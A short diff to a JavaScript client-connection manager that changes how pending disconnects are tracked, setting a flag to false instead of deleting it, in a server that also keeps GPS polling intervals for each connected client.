@@ -17,10 +17,10 @@ class Clients {
 
     clientConnect(connection, clientID, clientData) {
 
-        this.clientConnections[clientID] = connection;
+        let wasPending = clientID in this.ignoreDisconnects;
 
-        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
-        else this.ignoreDisconnects[clientID] = false;
+        this.clientConnections[clientID] = connection;
+        this.ignoreDisconnects[clientID] = wasPending;
 
         console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);
 
@@ -60,7 +60,7 @@ class Clients {
         }
 
         if (this.ignoreDisconnects[clientID]) {
-            delete this.ignoreDisconnects[clientID];
+            this.ignoreDisconnects[clientID] = false;
         } else {
             logManager.log(CONST.logTypes.info, clientID + " Disconnected")
             this.db.maindb.get('clients').find({ clientID }).assign({
@@ -69,7 +69,7 @@ class Clients {
             }).write()
             if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
             if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
-            delete this.ignoreDisconnects[clientID];
+            this.ignoreDisconnects[clientID] = false;
         }
     }
 
